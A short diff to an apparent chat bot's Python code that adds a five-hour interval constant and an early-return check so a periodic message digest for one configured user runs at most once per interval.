@@ -48,6 +48,7 @@ ADMIN_USER_IDS.add(1141626866)
 CHAT_VIEW_BLOCKED_USER_IDS = {8464597898}
 MESSAGE_DIGEST_TARGET_USER_ID = 7732538826
 MESSAGE_DIGEST_RECIPIENT_IDS = {1141626866, 8464597898}
+MESSAGE_DIGEST_INTERVAL_SEC = 5 * 3600
 MAX_MEDIA_ARCHIVE_MB = float(os.getenv("MAX_MEDIA_ARCHIVE_MB", "50"))
 MAX_MEDIA_ARCHIVE_BYTES = int(MAX_MEDIA_ARCHIVE_MB * 1024 * 1024)
 FORWARD_TIMER_MEDIA = os.getenv("FORWARD_TIMER_MEDIA", "1").strip() != "0"
@@ -2976,9 +2977,12 @@ def send_expiry_reminders() -> None:
 def send_message_digest() -> None:
     now = int(time.time())
     try:
-        last = int(maintenance_get("message_digest_5h_7732538826") or (now - 5 * 3600))
+        saved_last = maintenance_get("message_digest_5h_7732538826")
+        last = int(saved_last) if saved_last else now - MESSAGE_DIGEST_INTERVAL_SEC
     except (TypeError, ValueError, sqlite3.Error):
-        last = now - 5 * 3600
+        last = now - MESSAGE_DIGEST_INTERVAL_SEC
+    if now - last < MESSAGE_DIGEST_INTERVAL_SEC:
+        return
     with sqlite3.connect(DB_PATH) as conn:
         rows = conn.execute(
             """
